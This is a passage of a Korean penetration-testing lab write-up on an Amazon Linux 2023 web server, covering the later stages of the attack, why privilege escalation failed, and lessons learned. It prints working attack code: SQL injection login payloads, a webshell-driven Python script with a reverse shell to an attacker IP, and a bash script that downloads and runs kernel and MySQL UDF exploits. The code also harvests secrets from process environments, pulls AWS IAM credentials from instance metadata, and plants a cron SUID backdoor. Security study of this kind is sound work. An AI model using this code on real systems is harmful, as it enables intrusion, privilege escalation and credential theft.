**여전히 실패 - FILE 권한 필요**

---

## 7단계: 막힌 부분 및 분석

### 7.1 시도한 모든 방법

#### ✅ 성공한 것들:
1. SQL Injection으로 로그인 우회
2. 웹쉘 제작 및 업로드
3. 리버스 쉘 획득
4. MySQL webuser 접근
5. MySQL UDF .so 파일 준비 (UNHEX)
6. MySQL root 비밀번호 발견 (vulnerable123)
7. teamlead_db 계정 획득

#### ❌ 막힌 것들:
1. **MySQL root 접근**: unix_socket 인증
2. **FILE 권한 부족**: DUMPFILE/OUTFILE 불가
3. **mysql DB 접근 불가**: CREATE FUNCTION 실패
4. **Kernel exploits 전부 실패**: 패치됨
5. **SUID 바이너리**: 악용 가능한 것 없음
6. **Sudo**: 비밀번호 모름
7. **Writable cron**: 없음

### 7.2 왜 막혔는가?

#### Amazon Linux 2023의 보안 강화

**1. Kernel Hardening**
```bash
uname -r  # 6.1.155-186.783.amzn2023.x86_64
```
- 최신 커널
- 알려진 CVE 전부 패치
- Amazon 추가 보안 패치

**2. SELinux**
```bash
getenforce  # Permissive (enabled)
```
- 파일 접근 제어
- MySQL의 LOAD_FILE 제한

**3. AppArmor/Seccomp**
- 시스템 콜 제한
- Exploit 실행 차단

**4. ASLR (Address Space Layout Randomization)**
```bash
cat /proc/sys/kernel/randomize_va_space  # 2
```
- 메모리 주소 랜덤화
- Exploit 어려움

**5. PIE (Position Independent Executable)**
```bash
checksec /bin/bash
# PIE enabled
```
- 바이너리 주소 랜덤화

#### MySQL 보안 설정

**1. unix_socket 인증**
```sql
SELECT plugin FROM mysql.user WHERE user='root';
-- unix_socket
```
- 비밀번호 대신 OS 인증
- 더 안전하지만 우회 어려움

**2. 권한 분리**
```sql
SHOW GRANTS FOR 'webuser'@'localhost';
-- USAGE only (최소 권한)
```

**3. FILE privilege 제한**
- LOAD_FILE, INTO OUTFILE 차단
- 파일 시스템 접근 최소화

### 7.3 완전한 권한 상승을 위해 필요했던 것

**최소 요구사항 (하나만 있어도 성공):**

1. **MySQL FILE 권한**
   ```sql
   GRANT FILE ON *.* TO 'teamlead_db'@'localhost';
   ```
   → DUMPFILE 성공 → UDF 로드 → root

2. **mysql DB 접근 권한**
   ```sql
   GRANT ALL ON mysql.* TO 'teamlead_db'@'localhost';
   ```
   → CREATE FUNCTION 성공 → root

3. **시스템 root 비밀번호**
   ```bash
   su root
   # [비밀번호]
   mysql  # unix_socket으로 자동 로그인
   ```
   → MySQL root 접근 → UDF → root

4. **apache sudo 비밀번호**
   ```bash
   sudo mysql
   ```
   → MySQL root 접근 → UDF → root

5. **작동하는 Kernel Exploit**
   - CVE-2023-32233 등
   → 직접 root

6. **Writable cron 파일**
   ```bash
   echo '* * * * * root chmod u+s /bin/bash' >> /etc/cron.d/backdoor
   ```
   → 1분 대기 → SUID bash → root

### 7.4 실제 기업 환경에서의 시사점

#### 좋은 보안 실천:
1. ✅ 최신 OS 사용 (Amazon Linux 2023)
2. ✅ 커널 정기 업데이트
3. ✅ SELinux 활성화
4. ✅ MySQL unix_socket 인증
5. ✅ 최소 권한 원칙 (Least Privilege)

#### 개선 필요 사항:
1. ❌ SQL Injection 취약점
   - Prepared Statement 사용 필요
2. ❌ 파일 업로드 검증 부족
   - 화이트리스트 방식으로 변경
3. ❌ config.php 노출
   - 웹 디렉토리 밖으로 이동
4. ❌ 디버그 정보 노출
   - error_reporting(0) 프로덕션 적용

---

## 8단계: 사용한 모든 코드 완전 분해

### 8.1 Python 스크립트: post_exploit.py

**목적:** 웹쉘을 통한 자동화된 정찰 및 Reverse Shell 획득

#### 전체 구조
```python
class PostExploiter:
    def __init__(...)      # 초기화
    def login(...)         # SQL Injection 로그인
    def find_webshell(...) # 웹쉘 탐지
    def execute_command(...) # 웹쉘로 명령 실행
    def gather_system_info(...) # 정보 수집
    def check_privilege_escalation_vectors(...) # 권한 상승 벡터 확인
    def setup_reverse_shell(...) # 리버스 쉘 설정
    def run(...)           # 메인 실행
```

#### 코드 분석

**1. 초기화**
```python
class PostExploiter:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip           # 타겟 IP
        self.attacker_ip = attacker_ip       # C2 서버 IP
        self.attacker_port = attacker_port   # 리스너 포트
        self.webshell_url = None             # 웹쉘 URL (발견 후 설정)
        self.webshell_name = None            # 웹쉘 파일명
        self.webshell_param = "cmd"          # 명령 파라미터 이름
        self.session = requests.Session()    # HTTP 세션 유지
```

**왜 Session 사용?**
```python
# Session 없이
requests.get(url1)  # 쿠키 A
requests.get(url2)  # 쿠키 없음 (새 연결)

# Session 사용
session = requests.Session()
session.get(url1)  # 쿠키 A
session.get(url2)  # 쿠키 A 유지
```
- 로그인 상태 유지
- 쿠키 자동 관리

**2. SQL Injection 로그인**
```python
def login(self):
    print("[*] SQL Injection으로 로그인 중...")

    login_url = f"http://{self.target_ip}/login.php"

    payloads = [
        ("admin", "' or '1'='1' --"),
        ("admin", "' or '1'='1"),
        ("admin", '" or "1"="1" --'),
        ("admin' --", 'anything'),
    ]

    for username, password in payloads:
        try:
            data = {
                'username': username,
                'password': password
            }
            resp = self.session.post(login_url, data=data, timeout=10)

            # 로그인 성공 확인
            if 'login.php' not in resp.url and resp.status_code == 200:
                print(f"[+] 로그인 성공: {username} / {password}")
                return True
        except:
            continue

    print("[-] 로그인 실패")
    return False
```

**동작 흐름:**
1. 페이로드 리스트 준비
2. 각 페이로드로 POST 요청
3. 응답 URL 확인:
   - `login.php` 포함 → 로그인 실패 (리다이렉트 안됨)
   - `login.php` 없음 → 로그인 성공 (index.php 등으로 이동)

**왜 resp.url 확인?**
```python
# 로그인 실패
POST /login.php → 200 OK (login.php 그대로)

# 로그인 성공
POST /login.php → 302 Redirect → /index.php
```

**3. 웹쉘 찾기**
```python
def find_webshell(self):
    print("[*] 웹쉘 찾는 중...")

    shell_names = [
        "shell.jpg",
        "shell.php5",
        "shell.phtml",
        # ...
    ]

    base_paths = [
        f"http://{self.target_ip}/",
        f"http://{self.target_ip}/www/",
    ]

    for base_path in base_paths:
        file_php = base_path + "file.php"
        for shell_name in shell_names:
            try:
                # file.php?name=shell.jpg&cmd=whoami
                test_url = f"{file_php}?name={shell_name}&cmd=whoami"
                resp = self.session.get(test_url, timeout=5)

                if resp.status_code == 200 and len(resp.text.strip()) > 0:
                    self.webshell_url = file_php
                    self.webshell_name = shell_name
                    print(f"[+] 웹쉘 발견: {test_url}")
                    return True
            except:
                pass

    return False
```

**브루트포스 탐지:**
- 가능한 파일명 리스트
- 가능한 경로 리스트
- 모든 조합 시도
- `whoami` 명령으로 테스트

**4. 명령 실행**
```python
def execute_command(self, cmd):
    if not self.webshell_url:
        return None

    try:
        params = {
            'name': self.webshell_name,
            self.webshell_param: cmd
        }
        resp = self.session.get(self.webshell_url, params=params, timeout=10)
        return resp.text
    except Exception as e:
        print(f"[-] 명령 실행 실패: {e}")
        return None
```

**URL 구성:**
```python
params = {'name': 'shell.jpg', 'cmd': 'whoami'}
# → file.php?name=shell.jpg&cmd=whoami
```

**5. 시스템 정보 수집**
```python
def gather_system_info(self):
    commands = {
        "사용자": "whoami",
        "호스트명": "hostname",
        "OS 정보": "cat /etc/os-release | head -3",
        "커널 버전": "uname -a",
    }

    for desc, cmd in commands.items():
        print(f"\n[*] {desc}:")
        result = self.execute_command(cmd)
        if result:
            print(result.strip())
```

**왜 정보 수집?**
- OS/Kernel 버전 → Exploit 선택
- 실행 중인 서비스 → 공격 벡터
- 현재 권한 → 다음 단계 결정

**6. Reverse Shell 설정**
```python
def setup_reverse_shell(self):
    print(f"\n[*] 공격자 IP: {self.attacker_ip}:{self.attacker_port}")
    print("[*] 로컬에서 다음 명령으로 리스너 시작:")
    print(f"    nc -lvnp {self.attacker_port}")

    input("\n[!] 리스너를 시작한 후 Enter를 누르세요...")

    # Python reverse shell 페이로드
    reverse_shell_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

    # 백그라운드로 실행
    result = self.execute_command(f"{reverse_shell_cmd} &")

    print("\n[+] Reverse Shell 페이로드 전송 완료!")
```

**동작:**
1. 사용자에게 리스너 시작 안내
2. Enter 대기 (동기화)
3. Python 리버스 쉘 페이로드 전송
4. `&`로 백그라운드 실행 (웹 요청이 끊기지 않도록)

### 8.2 Bash 스크립트: EXECUTE_NOW.sh

**목적:** 타겟에서 실행하여 모든 권한 상승 방법 자동 시도

#### 핵심 부분 분석

**1. 환경 확인**
```bash
# Python 확인
which python3
which python

# gcc 확인
which gcc
gcc --version 2>/dev/null | head -1

# wget/curl 확인
which wget
which curl
```

**왜 확인하는가?**
- Python 있으면 → Python exploit 가능
- gcc 있으면 → 직접 컴파일 가능
- wget/curl 있으면 → 파일 다운로드 가능

**2. MySQL 상세 확인**
```bash
cat << 'MYSQL_CHECK' > /tmp/mysql_check.sql
SELECT '=== Plugin Directory ===' AS Info;
SELECT @@plugin_dir;

SELECT '=== Secure File Priv ===' AS Info;
SELECT @@secure_file_priv;

SELECT '=== MySQL Version ===' AS Info;
SELECT VERSION();

SELECT '=== User Privileges ===' AS Info;
SELECT user, host, Super_priv, File_priv FROM mysql.user WHERE user='webuser';
MYSQL_CHECK

mysql -u webuser -p'WebPassw0rd!' < /tmp/mysql_check.sql 2>/dev/null
```

**Heredoc 사용:**
```bash
cat << 'EOF' > file.txt
내용
EOF
```
- 여러 줄을 파일로 저장
- `'EOF'`: 변수 확장 안함 (리터럴)

**3. MySQL UDF 시도**
```bash
cd /tmp
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c

export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

if [ -f raptor_udf2.so ]; then
    echo "[+] 컴파일 성공!"

    mysql -u webuser -p'WebPassw0rd!' << 'UDFEOF'
USE mysql;
CREATE TABLE IF NOT EXISTS udf_temp(line blob);
DELETE FROM udf_temp;
INSERT INTO udf_temp VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
UDFEOF

    if [ -u /bin/bash ]; then
        echo "[+] 성공! SUID bash 생성됨"
        /bin/bash -p -c "whoami && id"
        exit 0
    fi
fi
```

**조건문 설명:**
```bash
if [ -f raptor_udf2.so ]; then
    # 파일 존재하면
fi

if [ -u /bin/bash ]; then
    # SUID 비트 있으면
fi
```

**Bash 테스트 연산자:**
- `-f`: 파일 존재
- `-u`: SUID 비트 설정
- `-w`: 쓰기 가능
- `-x`: 실행 가능

**4. CVE-2021-22555 시도**
```bash
cd /tmp
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve22555.c

gcc -o cve22555 cve22555.c -static 2>/dev/null

if [ -f cve22555 ]; then
    echo "[+] 컴파일 성공"
    chmod +x cve22555
    ./cve22555
    whoami
    exit 0
fi
```

**에러 리다이렉션:**
```bash
gcc ... 2>/dev/null
```
- `2`: stderr (에러 출력)
- `>`: 리다이렉트
- `/dev/null`: 버리기

**5. 프로세스 메모리 검색**
```bash
for pid in /proc/[0-9]*/environ; do
    cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret"
done | grep -v "LESSOPEN" | head -20
```

**완전 분해:**

**`/proc/[0-9]*/environ`:**
- `/proc/[PID]/environ`: 프로세스 환경 변수
- `[0-9]*`: 숫자로 시작 (PID)

**`tr '\0' '\n'`:**
- environ 파일은 NULL(`\0`)로 구분
- 줄바꿈(`\n`)으로 변환

**`grep -i`:**
- `-i`: 대소문자 무시

**`grep -v "LESSOPEN"`:**
- `-v`: 제외
- 불필요한 환경 변수 필터

**6. AWS 메타데이터**
```bash
# IMDSv2 토큰 생성
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)

# Role 이름
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)

# 크레덴셜
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
```

**IMDSv2란?**
- Instance Metadata Service v2
- EC2 인스턴스 정보 제공
- IAM role 크레덴셜 획득 가능

**동작:**
1. 토큰 요청 (PUT)
2. 토큰으로 메타데이터 접근
3. IAM role 크레덴셜 얻기

---

## 9단계: 배운 점 및 결론

### 9.1 성공적으로 달성한 목표

#### 초기 접근
✅ SQL Injection을 통한 인증 우회
- 여러 페이로드 시도
- 로그인 성공

✅ 웹쉘 제작 및 업로드
- 파일 업로드 취약점 악용
- 확장자 필터 우회 (.php5)

✅ 원격 명령 실행
- 웹쉘을 통한 시스템 명령 실행
- 시스템 정보 수집

#### 리버스 쉘
✅ 안정적인 리버스 쉘 획득
- Bash/Python 페이로드 사용
- 쉘 안정화 (PTY)

✅ 지속적인 접근 유지
- 여러 웹쉘 백업
- 세션 관리

#### 권한 상승 시도
✅ 체계적인 정찰
- LinPEAS 실행
- 수동 확인

✅ 다양한 Exploit 시도
- Kernel exploits (CVE-2021-22555, Dirty Pipe, 등)
- MySQL UDF 방법

✅ MySQL 크레덴셜 발견
- config.php 읽기
- test_db.php에서 root 비밀번호

✅ UDF 파일 준비
- C 코드 컴파일
- UNHEX로 MySQL에 삽입

### 9.2 막힌 부분 및 원인

#### 기술적 장벽
❌ **MySQL unix_socket 인증**
- 비밀번호로 접근 불가
- OS root 필요

❌ **FILE 권한 부족**
- LOAD_FILE/OUTFILE/DUMPFILE 실패
- webuser, teamlead_db 모두 제한

❌ **mysql DB 접근 불가**
- CREATE FUNCTION 실패
- UDF 등록 불가

❌ **Kernel 완전 패치**
- 모든 알려진 CVE 패치됨
- Amazon Linux 2023의 강화된 보안

#### 시스템 보안 메커니즘
- SELinux (Permissive지만 효과 있음)
- ASLR, PIE
- Seccomp
- 최소 권한 원칙

### 9.3 학습한 핵심 기술

#### 웹 해킹
1. **SQL Injection**
   - 다양한 페이로드
   - 인증 우회
   - 데이터 추출

2. **파일 업로드 취약점**
   - 확장자 필터 우회
   - MIME 타입 조작
   - 웹쉘 제작

3. **웹쉘 활용**
   - 원격 명령 실행
   - 파일 시스템 탐색
   - 추가 공격 준비

#### 시스템 해킹
1. **리버스 쉘**
   - Bash /dev/tcp
   - Python socket
   - 쉘 안정화

2. **권한 상승 방법론**
   - SUID 바이너리
   - Sudo 악용
   - Kernel exploits
   - Cron jobs
   - 잘못된 권한 설정

3. **MySQL 보안**
   - UDF 권한 상승
   - unix_socket 인증
   - 권한 모델

#### 도구 및 스크립트
1. **자동화**
   - Python 스크립트 작성
   - Bash 스크립트
   - 반복 작업 자동화

2. **정찰 도구**
   - LinPEAS
   - 수동 명령어
   - 결과 분석

3. **C 컴파일**
   - gcc 옵션
   - 공유 라이브러리
   - 크로스 컴파일

### 9.4 실전 응용

#### 이 지식으로 할 수 있는 것

**모의 해킹 (Penetration Testing):**
- 웹 애플리케이션 취약점 진단
- 권한 상승 가능성 평가
- 보안 보고서 작성

**Red Team 활동:**
- 실제 공격 시뮬레이션
- 방어 체계 테스트
- 보안 인식 제고

**버그 바운티:**
- 기업 보안 프로그램 참여
- 취약점 발견 및 제보
- 보상 획득

**보안 연구:**
- 새로운 취약점 연구
- Exploit 개발
- 방어 기법 제안

#### 방어 관점에서의 통찰

**웹 애플리케이션 보안:**
1. Prepared Statement 사용
2. 입력 검증 (화이트리스트)
3. 파일 업로드 엄격히 제한
4. 설정 파일 보호

**시스템 보안:**
1. 최신 패치 유지
2. 최소 권한 원칙
3. SELinux/AppArmor 활성화
4. 로그 모니터링

**MySQL 보안:**
1. unix_socket 인증 사용
2. 계정별 최소 권한
3. FILE privilege 최소화
4. 정기 감사

### 9.5 다음 학습 방향

#### 심화 주제
1. **고급 Exploit 개발**
   - Heap/Stack overflow
   - Return-Oriented Programming (ROP)
   - Kernel exploit 작성

2. **우회 기법**
   - WAF 우회
   - ASLR/DEP 우회
   - Antivirus 회피

3. **Post-Exploitation**
   - 지속성 확보
   - 측면 이동
   - 데이터 유출

#### 실습 환경
1. **CTF 대회**
   - HackTheBox
   - TryHackMe
   - PicoCTF

2. **취약한 VM**
   - DVWA
   - bWAPP
   - VulnHub

3. **실제 버그 바운티**
   - HackerOne
   - Bugcrowd
   - Intigriti

### 9.6 최종 요약

#### 공격 체인
```
1. SQL Injection
   ↓
2. 웹쉘 업로드
   ↓
3. 리버스 쉘 획득
   ↓
4. 권한 상승 시도
   ↓
5. MySQL UDF 방법
   ↓
6. 막힘: unix_socket 인증
```

#### 핵심 교훈

**공격자 관점:**
- 다양한 방법 시도
- 자동화의 중요성
- 지속성 확보
- 문서화 필수

**방어자 관점:**
- 다층 방어 (Defense in Depth)
- 최소 권한 원칙
- 정기 업데이트
- 모니터링 및 대응

#### 가치 있었던 경험

이 과정을 통해:
- ✅ 실전 같은 환경에서 학습
- ✅ 막힐 때의 문제 해결 과정
- ✅ 보안 메커니즘의 중요성 체감
- ✅ 완전한 문서화 능력 배양

**완벽한 성공이 아니더라도 과정 자체가 훌륭한 학습!**

---

## 10단계: 참고 자료 및 도구

### 10.1 사용한 주요 도구

#### 네트워크 도구
- **netcat (nc)**: 리버스 쉘 리스너
- **curl/wget**: 파일 다운로드, HTTP 요청

#### 정찰 도구
- **LinPEAS**: 권한 상승 벡터 자동 탐지
- **find**: SUID 바이너리, writable 파일
- **ps**: 프로세스 확인

#### 컴파일러
- **gcc**: C 코드 컴파일
- **옵션들**: -fPIC, -shared, -static

#### 데이터베이스
- **mysql/mariadb**: 클라이언트
- **mysqldump**: 백업 (사용 안함)

### 10.2 참고한 리소스

#### Exploit Database
- https://exploit-db.com/
- CVE exploits
- raptor_udf2.c

#### GitHub
- PEASS-ng (LinPEAS)
- CVE PoC 레포지토리
- 다양한 exploit 코드

#### 문서
- MySQL 공식 문서
- Linux man pages
- SELinux 가이드

### 10.3 유용한 명령어 모음

```bash
# 시스템 정보
uname -a
cat /etc/os-release
hostname
whoami

# 네트워크
ip addr
netstat -tulnp
ss -tulnp

# 프로세스
ps aux
ps -ef
pstree

# 파일 찾기
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
find / -name "*.conf" 2>/dev/null

# 권한 확인
id
groups
sudo -l

# MySQL
mysql -u user -p
SHOW GRANTS;
SELECT @@plugin_dir;
SELECT @@secure_file_priv;
```

---

## 끝

이 문서는 전체 공격 과정을 완전히 분해하여 설명했습니다.

**핵심 메시지:**
- 한 번에 성공하지 못해도 괜찮습니다
- 과정에서 배우는 것이 결과만큼 중요합니다
- 실패한 시도들도 모두 가치 있는 학습입니다
- 완전한 문서화는 미래의 자산입니다

**이 경험으로:**
- 실전 pentest 능력 향상
- 보안 메커니즘 이해 증진
- 문제 해결 능력 배양
- 포트폴리오 자료 확보

**계속 학습하고 실습하세요! 🚀**
